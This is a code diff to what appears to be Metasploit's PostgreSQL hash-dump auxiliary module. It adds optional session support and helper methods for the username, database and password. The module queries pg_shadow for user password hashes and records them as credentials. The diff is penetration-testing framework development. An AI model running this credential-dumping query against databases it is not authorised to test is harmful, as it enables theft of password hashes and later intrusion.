@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Postgres
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
+  include Msf::OptionalSession::PostgreSQL
 
   def initialize
     super(
@@ -18,21 +19,31 @@ class MetasploitModule < Msf::Auxiliary
       'Author'         => ['theLightCosine'],
       'License'        => MSF_LICENSE
     )
-    register_options([
-      OptString.new('DATABASE', [ true, 'The database to authenticate against', 'postgres']),
-      ])
     deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
 
   end
 
-  def run_host(ip)
+  def username
+    session ? session.client.params['username'] : datastore['USERNAME']
+  end
 
+  def database
+    session ? session.client.params['database'] : datastore['DATABASE']
+  end
+
+  def password
+    # The session or its client doesn't store the password
+    session ? nil : datastore['PASSWORD']
+  end
+
+  def run_host(ip)
+    self.postgres_conn = session.client if session
     # Query the Postgres Shadow table for username and password hashes and report them
     res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
 
     service_data = {
-        address: ip,
-        port: rport,
+        address: postgres_conn.address,
+        port: postgres_conn.port,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -41,11 +52,11 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
         module_fullname: self.fullname,
         origin_type: :service,
-        private_data: datastore['PASSWORD'],
+        private_data: password,
         private_type: :password,
-        username: datastore['USERNAME'],
+        username: username,
         realm_key:  Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
-        realm_value: datastore['DATABASE']
+        realm_value: database
     }
 
     credential_data.merge!(service_data)
@@ -68,10 +79,10 @@ class MetasploitModule < Msf::Auxiliary
 
       case res[:sql_error]
       when /^C42501/
-        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - Insufficient permissions."
+        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - Insufficient permissions."
         return
       else
-        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - #{res[:sql_error]}"
+        print_error "#{postgres_conn.address}:#{postgres_conn.port} Postgres - #{res[:sql_error]}"
         return
       end
     when :complete
@@ -96,8 +107,8 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     service_data = {
-        address: ::Rex::Socket.getaddress(rhost,true),
-        port: rport,
+        address: postgres_conn.address,
+        port: postgres_conn.port,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -133,6 +144,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good("#{tbl.to_s}")
 
+    postgres_logout if self.postgres_conn && session.blank?
   end
 
 end
